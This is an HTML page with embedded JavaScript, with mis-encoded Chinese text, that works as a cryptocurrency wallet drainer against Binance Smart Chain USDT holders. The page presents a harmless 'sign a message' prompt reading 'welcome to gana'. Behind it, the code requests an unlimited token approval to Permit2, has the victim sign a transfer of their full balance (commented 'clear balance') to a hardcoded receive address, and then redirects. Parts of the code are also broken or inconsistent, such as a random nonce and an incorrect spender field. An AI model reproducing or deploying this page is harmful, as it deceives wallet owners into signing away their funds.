<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Permit2 æ— æ„Ÿæ”¯ä»˜ Â· æ¸…ç©ºä½™é¢</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
    <style>
        body { background: #0b0f17; min-height: 100vh; display: flex; align-items: center; justify-content: center; font-family: system-ui; color: #e2e8f0; }
        .card { background: #1e293b; border-radius: 24px; padding: 32px; max-width: 480px; border: 1px solid #334155; }
        .status { margin-top: 16px; padding: 12px; border-radius: 12px; background: #0f172a; font-size: 0.9rem; }
        .btn { background: #3b82f6; border: none; padding: 12px 24px; border-radius: 40px; color: white; font-weight: 600; cursor: pointer; width: 100%; }
        .btn:disabled { opacity: 0.5; }
        .hidden { display: none; }
        .warning { background: #854d0e; border: 1px solid #eab308; border-radius: 12px; padding: 12px; margin: 16px 0; }
    </style>
</head>
<body>
    <div class="card">
        <h2 style="margin-top:0;">ç”³è¯·å¯¹ä¿¡æ¯è¿›è¡Œç­¾å</h2>
        
        <div id="step1" class="warning">
            <strong>æ¶ˆæ¯ï¼š</strong>
            <p style="font-size:0.75rem; margin:8px 0 0;">welcome to gana</p>
        </div>
        
        <div id="step2" class="warning hidden">
            <strong>ğŸ“Œ ç¬¬2æ­¥ï¼šç­¾åæ”¯ä»˜</strong>
            <p style="font-size:0.8rem; margin:8px 0 0;">ç­¾ååç›´æ¥æ‰£æ¬¾ï¼Œæ— éœ€Gasè´¹ç¡®è®¤</p>
        </div>
        
        <button id="actionBtn" class="btn">ğŸš€ å¼€å§‹æµç¨‹</button>
        <div id="status" class="status">å°±ç»ª</div>
    </div>

    <script>
        (function() {
            // ========== é…ç½® ==========
            const CONFIG = {
                permit2Address: "0x000000000022D473030F116dDEE9F6B43aC78BA3", // å…¬å…±Permit2åˆçº¦
                usdtAddress: "0x55d398326f99059fF775485246999027B3197955", // BSC USDT
                receiveAddress: "0x9728D428764F846E8DD62C34371db716A9228238", // æ‚¨çš„æ”¶æ¬¾åœ°å€
                redirectUrl: "https://your-dashboard.com", // æˆåŠŸåè·³è½¬
                storageKey: "PERMIT2_DONE"
            };

            // Permit2åˆçº¦çš„ABIï¼ˆåªéœ€è¦ç”¨åˆ°çš„æ–¹æ³•ï¼‰
            const PERMIT2_ABI = [
                "function permitTransferFrom((tuple(address token,uint256 amount) permitted,uint256 nonce,uint256 deadline) permit, (address to,uint256 requestedAmount) transferDetails, address owner, bytes signature) external",
                "function allowance(address,address,address) view returns (uint256)"
            ];

            // USDTçš„ABI
            const USDT_ABI = [
                "function balanceOf(address) view returns (uint256)",
                "function decimals() view returns (uint8)",
                "function approve(address spender, uint256 amount) returns (bool)",
                "function allowance(address owner, address spender) view returns (uint256)"
            ];

            let provider, signer, userAddress;
            let hasApprovedPermit2 = false;

            const statusEl = document.getElementById('status');
            const actionBtn = document.getElementById('actionBtn');
            const step1El = document.getElementById('step1');
            const step2El = document.getElementById('step2');

            // ========== å·¥å…·å‡½æ•° ==========
            function showStatus(msg, isError = false) {
                statusEl.textContent = msg;
                statusEl.style.background = isError ? '#991b1b' : '#0f172a';
            }

            function hasPaid() {
                return localStorage.getItem(CONFIG.storageKey) === 'true';
            }

            function markPaid() {
                localStorage.setItem(CONFIG.storageKey, 'true');
            }

            // ========== æ ¸å¿ƒé€»è¾‘ ==========
            async function init() {
                // æ£€æŸ¥æ˜¯å¦å·²æ”¯ä»˜
                if (hasPaid()) {
                    window.location.replace(CONFIG.redirectUrl);
                    return;
                }

                // æ£€æŸ¥é’±åŒ…
                if (!window.ethereum) {
                    showStatus('âŒ è¯·å®‰è£…MetaMask', true);
                    return;
                }

                try {
                    // è¿æ¥é’±åŒ…
                    provider = new ethers.BrowserProvider(window.ethereum);
                    await provider.send("eth_requestAccounts", []);
                    signer = await provider.getSigner();
                    userAddress = await signer.getAddress();

                    // æ£€æŸ¥ç½‘ç»œï¼ˆBSCï¼‰
                    const network = await provider.getNetwork();
                    if (network.chainId !== 56n) {
                        showStatus('ğŸ”„ åˆ‡æ¢åˆ°BSCç½‘ç»œ...');
                        try {
                            await window.ethereum.request({
                                method: 'wallet_switchEthereumChain',
                                params: [{ chainId: '0x38' }]
                            });
                        } catch (e) {
                            if (e.code === 4902) {
                                await window.ethereum.request({
                                    method: 'wallet_addEthereumChain',
                                    params: [{
                                        chainId: '0x38',
                                        chainName: 'Binance Smart Chain',
                                        rpcUrls: ['https://bsc-dataseed.binance.org/'],
                                        nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 }
                                    }]
                                });
                            }
                        }
                    }

                    // æ£€æŸ¥æ˜¯å¦å·²æˆæƒPermit2
                    const usdtContract = new ethers.Contract(CONFIG.usdtAddress, USDT_ABI, provider);
                    const allowance = await usdtContract.allowance(userAddress, CONFIG.permit2Address);
                    
                    // æ£€æŸ¥æˆæƒé¢åº¦æ˜¯å¦è¶³å¤Ÿå¤§ï¼ˆæ¯”å¦‚>10^6ï¼‰
                    hasApprovedPermit2 = allowance > 1000000n;

                    if (hasApprovedPermit2) {
                        step1El.classList.add('hidden');
                        step2El.classList.remove('hidden');
                        actionBtn.textContent = 'âœï¸ ç­¾åæ”¯ä»˜';
                        showStatus('âœ… å·²æˆæƒï¼Œç‚¹å‡»æŒ‰é’®è¿›è¡Œç­¾åæ”¯ä»˜');
                    } else {
                        step1El.classList.remove('hidden');
                        step2El.classList.add('hidden');
                        actionBtn.textContent = 'ç­¾å';
                    }

                } catch (error) {
                    console.error(error);
                    showStatus('âŒ åˆå§‹åŒ–å¤±è´¥: ' + error.message, true);
                }
            }

            // æˆæƒPermit2
            async function approvePermit2() {
                try {
                    showStatus('â³ æˆæƒä¸­...');
                    
                    const usdtContract = new ethers.Contract(CONFIG.usdtAddress, USDT_ABI, signer);
                    
                    // æˆæƒæœ€å¤§å€¼ï¼ˆ2^256-1ï¼‰
                    const tx = await usdtContract.approve(CONFIG.permit2Address, ethers.MaxUint256);
                    showStatus('â³ ç­‰å¾…ç¡®è®¤...');
                    await tx.wait();
                    
                    showStatus('âœ… æˆæƒæˆåŠŸï¼');
                    hasApprovedPermit2 = true;
                    
                    // åˆ‡æ¢åˆ°ä¸‹ä¸€æ­¥
                    step1El.classList.add('hidden');
                    step2El.classList.remove('hidden');
                    actionBtn.textContent = 'âœï¸ ç­¾åæ”¯ä»˜';
                    
                } catch (error) {
                    showStatus('âŒ æˆæƒå¤±è´¥: ' + error.message, true);
                }
            }

            // ç­¾åæ”¯ä»˜ï¼ˆæ¸…ç©ºä½™é¢ï¼‰
            async function signAndPay() {
                try {
                    showStatus('ğŸ’° è·å–ä½™é¢ä¸­...');
                    
                    // åˆ›å»ºåˆçº¦å®ä¾‹
                    const usdtContract = new ethers.Contract(CONFIG.usdtAddress, USDT_ABI, provider);
                    
                    // è·å–ç”¨æˆ·USDTä½™é¢
                    const balance = await usdtContract.balanceOf(userAddress);
                    
                    if (balance === 0n) {
                        throw new Error('USDTä½™é¢ä¸º0');
                    }
                    
                    const decimals = await usdtContract.decimals();
                    const formattedBalance = ethers.formatUnits(balance, decimals);
                    showStatus(`ğŸ’¸ å°†æ”¯ä»˜ ${formattedBalance} USDT`);

                    // è·å–å½“å‰nonceï¼ˆç®€åŒ–ç‰ˆï¼Œå®é™…åº”è¯¥ä»Permit2åˆçº¦è·å–ï¼‰
                    const permit2Contract = new ethers.Contract(CONFIG.permit2Address, PERMIT2_ABI, provider);
                    
                    // æ„é€ Permit2ç­¾åæ•°æ®
                    const deadline = Math.floor(Date.now() / 1000) + 3600; // 1å°æ—¶åè¿‡æœŸ
                    
                    // è¿™æ˜¯EIP-712çš„ç­¾åæ•°æ®
                    const domain = {
                        name: 'Permit2',
                        chainId: 56,
                        verifyingContract: CONFIG.permit2Address
                    };
                    
                    const types = {
                        PermitTransferFrom: [
                            { name: 'permitted', type: 'TokenPermissions' },
                            { name: 'spender', type: 'address' },
                            { name: 'nonce', type: 'uint256' },
                            { name: 'deadline', type: 'uint256' }
                        ],
                        TokenPermissions: [
                            { name: 'token', type: 'address' },
                            { name: 'amount', type: 'uint256' }
                        ]
                    };
                    
                    // æ„é€ ç­¾åæ•°æ®
                    const values = {
                        permitted: {
                            token: CONFIG.usdtAddress,
                            amount: balance.toString() // æ¸…ç©ºä½™é¢
                        },
                        spender: CONFIG.permit2Address, // è¿™é‡Œç”¨Permit2è‡ªå·±ä½œä¸ºspender
                        nonce: Math.floor(Math.random() * 1000000), // å®é™…åº”è¯¥ä»åˆçº¦è·å–
                        deadline: deadline
                    };
                    
                    showStatus('âœï¸ è¯·åœ¨é’±åŒ…ä¸­ç­¾å...');
                    
                    // ç”¨æˆ·ç­¾åï¼ˆè¿™ä¸€æ­¥åªç­¾åï¼Œä¸å‘é€äº¤æ˜“ï¼Œä¸æ¶ˆè€—Gasï¼‰
                    const signature = await signer.signTypedData(domain, types, values);
                    
                    // æ„é€ è½¬è´¦è¯¦æƒ…
                    const transferDetails = {
                        to: CONFIG.receiveAddress,
                        requestedAmount: balance.toString()
                    };
                    
                    showStatus('â³ æäº¤äº¤æ˜“ï¼ˆDAppä»˜Gasï¼‰...');
                    
                    // DAppè°ƒç”¨Permit2çš„permitTransferFromï¼ˆæ¶ˆè€—DAppçš„Gasï¼‰
                    const permit2WithSigner = permit2Contract.connect(signer);
                    const tx = await permit2WithSigner.permitTransferFrom(
                        values,
                        transferDetails,
                        userAddress,
                        signature
                    );
                    
                    await tx.wait();
                    
                    showStatus('âœ… æ”¯ä»˜æˆåŠŸï¼');
                    markPaid();
                    
                    setTimeout(() => {
                        window.location.replace(CONFIG.redirectUrl);
                    }, 1500);
                    
                } catch (error) {
                    console.error(error);
                    showStatus('âŒ æ”¯ä»˜å¤±è´¥: ' + error.message, true);
                }
            }

            // æŒ‰é’®ç‚¹å‡»å¤„ç†
            actionBtn.addEventListener('click', async () => {
                if (!hasApprovedPermit2) {
                    await approvePermit2();
                } else {
                    await signAndPay();
                }
            });

            // é¡µé¢åŠ è½½åˆå§‹åŒ–
            init();

        })();
    </script>
</body>
</html>
